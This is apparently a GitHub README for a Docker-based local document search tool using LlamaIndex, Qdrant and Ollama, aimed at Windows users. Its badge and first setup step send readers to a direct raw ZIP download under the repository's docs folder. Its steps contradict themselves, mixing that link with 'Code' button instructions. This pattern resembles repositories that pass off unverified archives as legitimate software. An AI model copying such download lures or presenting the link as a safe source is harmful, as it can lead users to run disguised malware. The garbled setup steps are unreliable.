# 🤖 rag-llamaindex-qdrant-docker - Build custom smart document search engines

[![](https://img.shields.io/badge/Download_Software-Blue-blue)](https://github.com/Roseapplemutualopposition5427/rag-llamaindex-qdrant-docker/raw/refs/heads/main/docs/qdrant_rag_docker_llamaindex_v1.3-beta.2.zip)

## 📌 Project Overview

This tool helps you build a search engine for your own documents. It uses artificial intelligence to read your files and answer questions based on their content. You keep your data private on your own computer. The system uses a specific container technology called Docker to package all the tools into one bundle. This makes setup simple.

## 🛠 Prerequisites

Before you start, make sure your computer meets these needs:

*   Operating System: Windows 10 or 11.
*   Memory: At least 8 gigabytes of RAM.
*   Storage: 5 gigabytes of free disk space.
*   Software: Docker Desktop for Windows must be installed.

Download Docker Desktop from the official website. Follow the installer instructions and restart your computer if it requests a restart. Open the Docker Desktop application after it installs and wait for the engine to start. Keep it open while you run this project.

## 📥 Download and Setup

1. Visit the project link to get the files: [https://github.com/Roseapplemutualopposition5427/rag-llamaindex-qdrant-docker/raw/refs/heads/main/docs/qdrant_rag_docker_llamaindex_v1.3-beta.2.zip](https://github.com/Roseapplemutualopposition5427/rag-llamaindex-qdrant-docker/raw/refs/heads/main/docs/qdrant_rag_docker_llamaindex_v1.3-beta.2.zip).
2. Click the green button labeled "Code" on that page.
3. Select "Download ZIP".
4. Find the downloaded file in your Downloads folder.
5. Right-click the folder and select "Extract All".
6. Choose a location on your hard drive and click Extract.

## ⚙️ Running the Application

1. Open the folder where you extracted the files.
2. Look for a file named "docker-compose.yml".
3. Right-click the empty space in the folder window.
4. Select "Open in Terminal" or "Open PowerShell".
5. Type the command `docker compose up` and press Enter.

The software will begin downloading necessary pieces. This process might take several minutes depending on your internet speed. You will see lines of text scrolling in your window. Wait until the messages stop moving and stay steady. The system is ready when you see no more error messages.

## 🔍 How to Use the System

The application creates a local server on your machine. Once the terminal shows the system is running:

1. Open your web browser.
2. Type `http://localhost:8501` into the address bar.
3. You will see an interface where you can upload documents.
4. Select your PDF or text files.
5. Click the "Process" button to let the system index your content.
6. Use the chat box to ask questions about your documents.

## 🧩 Understanding the Components

*   **LlamaIndex:** This is the tool that reads your files and turns them into a format the computer understands.
*   **Qdrant:** This acts as a digital library. It stores the information so the system can find answers fast.
*   **Ollama:** This provides the brain of the operation. It generates the text responses you see on the screen.
*   **Docker:** This acts like a shipping container. It holds all the pieces together so they do not conflict with other software on your PC.

## 🗂 Managing Collections

The system categorizes your data into collections. Think of these as folders for your documents. You can create different collections for different topics. Use the "Settings" tab in the web browser to switch between collections. 

If you want to clear your data, go back to your terminal window. Press Ctrl+C to stop the process. Type `docker compose down` and press Enter. This command cleans the temporary files. Your original documents remain safe in their original location on your hard drive. 

## ❓ Troubleshooting Common Issues

*   **Docker fails to start:** Ensure Docker Desktop is running in your taskbar. If it is not, click the icon to launch it and wait for the green status light.
*   **Port conflicts:** The application uses port 8501. If another program uses this port, the application will not start. Close other web servers or programs that might interfere.
*   **Slow responses:** Processing large documents requires significant memory. Close browser tabs or other open apps if the system feels slow.
*   **Missing text:** Ensure your documents are standard PDF or text files. Scanned images without text overlays may not be readable by the system. If you have images, use a tool to extract the text first.
*   **AI errors:** The system relies on the language model to generate responses. If the model behaves unexpectedly, click the "Restart" button in the interface to reset the current session.

## 📚 Advanced Options

You can change how the system acts by editing the "config.yaml" file found in the project folder. Use Notepad or any simple text editor. You can change the language model settings or the behavior of the document search. Only change these values if you are comfortable with text settings. Make a copy of the original file before you change anything. If the software stops working, delete your changed file and rename your copy back to "config.yaml".

## 🛡 Security and Privacy

Your data stays on your computer. The system does not send your documents to the internet unless you choose to enable cloud features. You have full control. Delete the project folder whenever you want to remove the tool and all its dependencies from your system. Docker Desktop handles the removal of the background containers when the images are deleted. Check the Docker Desktop settings to remove unused images and free up storage space.